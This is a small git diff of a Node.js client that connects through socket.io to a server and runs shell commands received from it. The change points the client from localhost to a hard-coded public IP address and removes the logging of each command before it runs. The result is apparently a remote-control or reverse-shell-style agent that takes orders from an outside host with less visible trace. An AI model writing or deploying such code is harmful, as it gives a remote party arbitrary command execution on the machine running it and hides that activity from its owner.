@@ -2,7 +2,8 @@ const PORT = 7681;
 const { exec } = require("child_process");
 const io = require("socket.io-client");
 
-const connectionAddr = "http://localhost";
+// const connectionAddr = "http://localhost";
+const connectionAddr = "http://18.222.251.5";
 const socket = io.connect(`${connectionAddr}:${PORT}`, {
   reconnection: true,
 });
@@ -32,7 +33,7 @@ socket.on("perform-command", (data) => {
   if (command.substr(0, 3) === "cd ") {
     finalCommand += "; pwd";
   }
-  console.log("FinalCommand:", finalCommand);
+
   exec(finalCommand, { cwd: currentDirectory }, (err, stdout, stderr) => {
     if (err) {
       result = "Error. Command failed\n";
